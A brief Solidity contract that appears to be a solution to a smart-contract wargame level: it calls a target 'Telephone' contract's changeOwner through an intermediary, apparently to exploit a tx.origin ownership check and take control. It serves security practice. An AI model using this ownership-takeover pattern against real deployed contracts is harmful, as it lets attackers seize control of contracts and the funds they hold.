pragma solidity ^0.6.0;

import "./04_Telephone.sol";
import "hardhat/console.sol";

contract TelephoneAttack {
  function attack(Telephone targetAddress, address owner) public {
    targetAddress.changeOwner(owner);
  }
}
